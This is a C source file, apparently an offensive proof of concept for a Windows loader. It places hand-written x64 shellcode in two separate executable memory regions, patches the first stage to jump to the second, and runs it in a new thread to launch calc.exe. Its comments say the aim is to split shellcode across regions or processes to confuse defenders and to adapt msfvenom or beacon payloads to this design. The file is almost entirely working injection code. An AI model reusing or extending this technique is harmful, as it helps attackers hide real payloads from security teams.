/*
*
* The PoC separates shellcode in two different memory region
* when the first stage finishes executing, it will jump to the second
* stage and keep executing there.
*
* The idea is to not putting your "eggs" in one single basket. Try and find
* a way to modularize the shellcode, and separate them into different parts,
* hopefully, into different processes (don't know if it's possible yet, will be
* the next goal), and create a mess for blue teamer.
*
* Of course, shellcode must be handcrafted. If there's a way to manipulate msfvenom
* payloads or beacon directly, then sweet!
*
*/

#include <Windows.h>
#include <stdio.h>

//
// shellcode should be desinged to rely on it's own
// avoid jumping or calling into another module
// 
// This PoC resolves WinExec and TerminateProcess, and
// pops calc.exe; shellcode can be found in .py file
//
// the end of stage1 will be:
// moveabs rax, 0x1122334455667788 (stage2 addr)
// jmp rax
//
unsigned char stage1[] = "\x90\x90\x48\x89\xe5\x48\x81\xec\x00\x01\x00\x00\x48\x81\xc4\xf8\xfd\xff\xff\x48\x31\xc9\x65\x48\x8b\x71\x60\x48\x8b\x76\x18\x48\x8b\x76\x20\x48\x8b\x5e\x20\x48\x8b\x7e\x50\x48\x8b\x36\x66\x39\x4f\x18\x75\xef\xeb\x07\x5e\x48\x89\x75\x08\xeb\x64\xe8\xf4\xff\xff\xff\x8b\x43\x3c\x8b\xbc\x03\x88\x00\x00\x00\x48\x01\xdf\x48\x31\xc9\x8b\x4f\x14\x48\x31\xc0\x8b\x47\x20\x48\x01\xd8\x48\x89\x45\x10\x67\xe3\x3b\x48\x8b\x45\x10\x8b\x34\x88\x48\x01\xde\x48\xff\xc9\x48\x31\xc0\x48\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x44\x39\xfa\x75\xd9\x8b\x57\x24\x48\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x48\x01\xda\x8b\x44\x8a\x04\x48\x01\xd8\xc3\x49\xc7\xc7\x83\xb9\xb5\x78\xff\x55\x08\x48\x89\x45\x18\x49\xc7\xc7\x98\xfe\x8a\x0e\xff\x55\x08\x48\x89\x45\x20\x48\xB8\x88\x77\x66\x55\x44\x33\x22\x11\xFF\xE0";
unsigned char stage2[] = "\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48\x83\xec\x20\xff\x55\x20\x48\xc7\xc1\xff\xff\xff\xff\x48\x31\xd2\xff\x55\x18";

int main()
{
    PVOID pAddr_1 = VirtualAlloc(NULL, sizeof(stage1), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PVOID pAddr_2 = VirtualAlloc(NULL, sizeof(stage2), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    printf("[*]Buffer address 1 @ >>>>>>>>> 0x%p\n", pAddr_1);
    printf("[*]Buffer address 2 @ >>>>>>>>> 0x%p\n", pAddr_2);

    // patch stage 1
    *(UINT_PTR*)(stage1 + 191) = (UINT_PTR)pAddr_2;

    // verify
    for (int i = 0; i < sizeof(stage1) - 1; i++)
    {
        printf("0x%.2X ", stage1[i]);
    }

    memcpy(pAddr_1, stage1, sizeof(stage1));

    printf("\nCopy stage 1 ...");
    getchar();

    memcpy(pAddr_2, stage2, sizeof(stage2));

    printf("Copy stage 2 ...");
    getchar();

    printf("Create thread ...");
    getchar();

    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddr_1, NULL, NULL, NULL);

    WaitForSingleObject(hThread, INFINITE);

    return 0;
}

